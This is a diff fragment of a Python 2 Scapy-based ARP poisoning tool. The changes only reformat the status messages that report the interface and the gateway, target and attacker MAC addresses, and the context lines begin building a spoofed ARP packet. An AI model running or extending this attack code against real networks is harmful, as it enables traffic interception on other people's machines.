@@ -52,22 +52,23 @@ class ArpPoison:
     def arp_poison(self):
         print("[*] Started ARP poison attack [CTRL-C to stop]")
         try:
-            print "interface: " + str(self.interface)
+            print "[*] Interface: " + str(self.interface)
             my_mac = get_if_hwaddr(self.interface)
 
             while (self.gateway_mac is None or self.target_mac is None) and not self.continueRunning:
                 if self.target_mac is None:
-                    print "[*] Could not find mac of target"
+                    print "[-] Could not find mac of target"
                     self.target_mac = getmacbyip(self.target_ip)
 
                 if self.gateway_mac is None:
-                    print "[*] Could not find mac of gateway"
+                    print "[-] Could not find mac of gateway"
                     self.gateway_mac = getmacbyip(self.gateway_ip)
                 time.sleep(1)
-                print "Retrying"
+                print "[*] Retrying"
 
-            print("gatewaymac: " + str(self.gateway_mac) + ", targetmac: " + str(self.target_mac) + ", our mac: " + str(
-                my_mac))
+            print("[*] Gateway mac: " + str(self.gateway_mac))
+            print("[*] Target mac: " + str(self.target_mac))
+            print("[*] Your mac: " + str(my_mac))
 
             packet1 = Ether() / ARP()
             packet1[Ether].src = my_mac
